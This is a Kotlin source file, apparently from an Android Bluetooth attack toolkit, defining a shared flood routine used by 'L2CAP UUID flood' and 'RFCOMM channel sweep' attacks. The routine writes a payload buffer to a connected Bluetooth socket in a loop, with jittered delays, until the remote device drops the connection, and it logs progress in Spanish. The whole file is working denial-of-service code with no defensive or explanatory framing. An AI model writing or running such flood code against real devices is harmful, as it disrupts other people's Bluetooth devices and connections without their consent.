package api

import android.bluetooth.BluetoothSocket
import java.io.IOException

/**
 * Shared flood loop used by the RFCOMM-based attacks (L2CAP UUID flood and
 * RFCOMM channel sweep): writes the configured payload pattern until the
 * connection drops or the attack is stopped.
 */
internal object FloodSupport {

    suspend fun flood(
        socket: BluetoothSocket,
        payloadPattern: PayloadPattern,
        payloadSize: Int,
        rateDelayMs: Int,
        running: () -> Boolean,
        onLog: (String) -> Unit,
        tag: String
    ) {
        val raw = socket.maxTransmitPacketSize
        val dataSize = if (payloadSize > 0) payloadSize else (if (raw > 0) raw else 600)
        val buffer = payloadPattern.buffer(dataSize)
        try {
            var blocks = 0
            while (running() && socket.isConnected) {
                socket.outputStream.write(buffer)
                blocks++
                jitterDelay(rateDelayMs)
                if (blocks % 200 == 0) onLog("[$tag][DATA] Enviados $blocks bloques ($dataSize B)")
            }
        } catch (e: IOException) {
            // connection dropped by the remote side — expected under flood
        } finally {
            runCatching { socket.close() }
        }
    }
}
